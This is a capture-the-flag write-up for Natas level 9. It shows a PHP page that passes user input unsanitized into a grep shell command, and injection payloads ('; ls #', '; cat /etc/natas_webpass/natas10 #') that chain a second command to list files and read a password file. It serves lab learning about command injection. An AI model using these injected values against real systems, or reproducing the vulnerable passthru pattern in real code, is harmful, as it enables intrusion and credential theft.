# Natas9
#natas #command-injection
## Vulnerability:
OS command injection: The application passes user-controlled input directly into a system command without proper sanitization.
## Technique:
Injected commands to `needle` parameter.
#### Steps:
###### 1) Inspecting the source code
```php
<?   
$key = "";      
if(array_key_exists("needle", $_REQUEST)) {    
    $key = $_REQUEST["needle"];   
}      
if($key != "") {    
    passthru("grep -i $key dictionary.txt");  
}   
?>
```
This means the code takes `needle` parameter value and inserts it directly to the command: `grep -i <input> dictionary.txt`
###### 2) Exploiting command injection
We tried multiple commands in order to find the password file.
Firstly, we tried:
```
; ls #
```
The full command becomes :
```bash
grep -i ; ls # dictionary.txt
```
**Result:**

<img width="1204" height="536" alt="image" src="https://github.com/user-attachments/assets/86e867a9-7feb-4014-924a-6d28522ccd00" />

We confirmed the presence of command injection. 
We can now add multiple commands to find password location.
From `Natas7`, the passwords are located in `/etc/natas_webpass/`, we'll use command injection to cat the password for natas10.
**Command:**
```bash
; cat /etc/natas_webpass/natas10 #
```
**Result:**

<img width="1202" height="468" alt="image" src="https://github.com/user-attachments/assets/efbc7845-53b2-4eb5-8de0-f90ba2821c93" />


## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas8](./Natas8.md)
## Next Level:
[Natas10](./Natas10.md)
